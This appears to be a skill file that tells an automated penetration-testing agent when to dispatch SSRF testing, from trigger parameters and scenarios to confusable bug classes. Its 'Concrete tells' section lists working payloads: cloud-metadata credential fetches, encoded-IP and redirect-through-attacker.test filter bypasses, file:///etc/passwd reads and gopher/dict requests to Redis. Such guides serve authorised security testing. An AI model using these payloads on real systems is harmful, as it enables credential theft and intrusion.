# ssrf — when to use

## Trigger signals (dispatch this skill the moment you observe…)

- **A parameter whose value looks like a URL, host, or path** — `url=`, `uri=`, `link=`, `src=`, `dest=`, `target=`, `redirect=`, `redirect_uri=`, `next=`, `return=`, `continue=`, `callback=`, `webhook=`, `fetch=`, `load=`, `proxy=`, `forward=`, `feed=`, `data=`, `domain=`, `host=`, `path=`, `page=`, `file=`, `image=`, `img=`, `avatar=`, `photo=`, `logo=`, `icon=`, `document=`, `pdf=`, `template=`, `endpoint=`, `api=` → if any param already holds a full `http(s)://…` value, this skill applies.
- **A feature that fetches something on your behalf** — "import from URL", "fetch by link", "preview this link", "test webhook", "screenshot / PDF this page", "validate this SSO endpoint", "add RSS/ICS feed", "load avatar from URL", "remote upload", "URL health check / uptime monitor" → if the server reaches out to a URL you supplied, dispatch SSRF.
- **A response that proves the server fetched your URL** — the body contains content from a domain you pointed it at, or an Open Graph / link-preview card is generated from your link, or an HTTP timing change correlates with the host/port you supplied → server-side fetch confirmed.
- **An outbound DNS or HTTP hit lands on your OAST/collaborator listener** after you injected its hostname into a URL-shaped parameter → blind SSRF confirmed even with no visible response.
- **Error strings that leak a server-side HTTP client** — `Connection refused`, `Connection timed out`, `No route to host`, `Name or service not known`, `getaddrinfo ENOTFOUND`, `failed to connect to 127.0.0.1`, `couldn't connect to host`, `SSL certificate problem`, `requests.exceptions.ConnectionError`, `java.net.ConnectException`, `dial tcp: connection refused`, `cURL error 7` → the app is making the request and surfacing client-library errors. The differing errors per target are an internal port-map oracle.
- **Different responses for `127.0.0.1` vs `10.255.255.1` vs a real external host** (different status, length, or timing) → the server is reaching internal addresses and the diff is your blind oracle.
- **A blocklist message** like `Invalid URL`, `Only http/https allowed`, `Internal addresses are not permitted`, `IP not allowed`, `Host not in allowlist` → there IS a fetcher behind a filter; this is exactly the surface for bypass attempts (encoded IPs, redirects, parser differentials).
- **Recon fingerprints of a cloud / containerized host** — Server headers or behavior suggesting AWS/GCP/Azure, `X-Amz-*` headers, Kubernetes ingress signatures, service-mesh sidecar headers (`x-envoy-*`), or any sign the app runs in a cloud VM/pod → SSRF here is high-value because `169.254.169.254` and friends may be one fetch away.
- **A redirect/return parameter that follows the value server-side** (not just a client `Location:` you can ignore) → if the server itself follows redirects, dispatch — redirect chains are a primary filter bypass.

## Use-case scenarios

- **Link-preview / unfurl features.** Chat apps, comment systems, and dashboards that turn a pasted URL into a title/thumbnail card all fetch the page server-side. You control the URL; point it at internal addresses or cloud metadata.
- **Document / report / chart exporters.** "Export to PDF", "render this HTML", "generate screenshot" pipelines (wkhtmltopdf, headless Chrome, SVG/chart renderers) fetch embedded resources server-side. Even if the visible field is HTML/SVG rather than a URL param, an `<img>`, `<iframe>`, or SVG `<foreignObject>` pointing inward triggers a server fetch — dispatch SSRF.
- **Webhook configuration and "test webhook" buttons.** The app sends a request to a URL you set. These often allow arbitrary methods and headers, which unlocks IMDSv2 (`PUT` + token header), GCP (`Metadata-Flavor: Google`), and Azure (`Metadata: true`).
- **Importers and integrations.** "Import from URL", remote file fetch, RSS/Atom/ICS feed readers, repository/package fetchers (git/npm/pip clone-by-URL), avatar/profile-image-by-URL — all are server-initiated fetches of attacker-chosen URLs.
- **SSO / OAuth / OIDC discovery and `redirect_uri` validation.** Endpoints that fetch a discovery document or validate a callback server-side are SSRF surfaces, especially when the validator follows redirects.
- **Image/media processing by URL.** Thumbnailers and transcoders that accept a source URL fetch it server-side before processing.
- **GraphQL resolvers and API gateways** that take a URL/host argument and fetch it, or proxy/forward endpoints that route by a user-influenced `Host`/`X-Forwarded-Host` header.
- **Cloud / Kubernetes-hosted targets generally.** Any confirmed server-side fetch on a cloud or container host should immediately be pivoted toward metadata services, container runtime sockets, kubelet/API server, and service-mesh admin ports — that is where SSRF converts into credentials and lateral movement.
- **Blind / response-less fetchers.** Background jobs, analytics beacons, Referer trackers, and "queued for processing" features that never echo a body — dispatch SSRF with an OAST oracle and timing analysis.

## Concrete tells (request → response examples)

- **In-band fetch confirmation:**
  `GET /preview?url=http://OAST_HOST/probe` → your collaborator logs a DNS + HTTP hit from the *target's* egress IP, and/or the response embeds content served by `OAST_HOST`. → SSRF confirmed.
- **Internal vs external diff:**
  `GET /fetch?url=http://127.0.0.1:80/` returns a short page or a distinctive error, while `http://127.0.0.1:1` returns `Connection refused` instantly and `http://10.255.255.1` hangs to a timeout. → Server is reaching loopback/internal; the timing/error diff is a working port-map oracle.
- **Cloud metadata:**
  `GET /fetch?url=http://169.254.169.254/latest/meta-data/` returns a directory listing like `ami-id / hostname / iam/` → AWS IMDSv1 reachable. Then `/iam/security-credentials/<role>` returns JSON with `AccessKeyId`/`SecretAccessKey`/`Token` → CRITICAL.
  GCP: `http://metadata.google.internal/computeMetadata/v1/` with header `Metadata-Flavor: Google` returns instance data.
  Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with header `Metadata: true`.
- **Filter present, bypassable:**
  `url=http://127.0.0.1` → `403 Internal addresses are not permitted`, but `url=http://0x7f000001/` or `url=http://2130706433/` or `url=http://127.1/` or `url=http://[::ffff:127.0.0.1]/` → goes through. → Decimal/hex/octal/IPv6 encoding beats the blocklist.
- **Redirect bypass:**
  `url=http://attacker.test/r` where `/r` returns `302 Location: http://169.254.169.254/latest/meta-data/` → if the metadata listing comes back, the allowlist was applied pre-redirect only.
- **Protocol smuggling:**
  `url=file:///etc/passwd` returns `root:x:0:0:` → file scheme honored.
  `url=dict://127.0.0.1:6379/INFO` or a `gopher://127.0.0.1:6379/_…` payload eliciting a Redis response → internal service reachable via alternate protocol.
- **Blind, timing-only:**
  `url=http://127.0.0.1:22/` responds in ~30ms (port open, banner read stalls) while `:23/` returns instantly with `Connection refused`. → Reachability inferred from timing despite no body.

## When NOT to use it / easily-confused-with

- **The fetch happens in the browser, not on the server.** If the supplied URL is only loaded client-side (an `<img>` rendered in *your own* browser, a client-side `fetch()`, a value that just appears in a `Location:` header you follow yourself), there is no server-initiated request — that is not SSRF. Confirm server-side egress (OAST hit from the target IP, or an internal-only response difference) before dispatching.
- **The URL/host value is reflected into the page or echoed back unsanitized.** A URL parameter that shows up verbatim in HTML/JS is reflected **XSS**, not SSRF — unless the server actually fetches it. Reflection ≠ fetch.
- **The value is interpolated into a server-side template and evaluated** (e.g. `{{7*7}}` → `49`) → that is **SSTI**, not SSRF.
- **The value is a local filesystem path joined into a file read** (`../../etc/passwd`, no scheme, no network fetch) → that is **path traversal / LFI**, not SSRF. SSRF requires the server to make a *network* request (or honor a `file://`/`gopher://`-style URL scheme through its HTTP client).
- **An open-redirect that only emits a client-side `Location:`** is its own (lower-severity) bug — route to SSRF only if the server *follows* the redirect itself or if you are using it as a redirect-chain bypass for a confirmed fetcher.
- **Egress is genuinely blocked everywhere** — every target and protocol returns the same uniform error/timeout with no diffs, OAST never fires, and strict DNS-pinned allowlists reject all redirects. The fetcher may exist but be non-exploitable; record and move on rather than burning iterations.
- **A mock/sandbox returning canned responses** with no real network call (identical "success" for unreachable and reachable hosts alike) is a false positive — require a real egress proof before claiming SSRF.
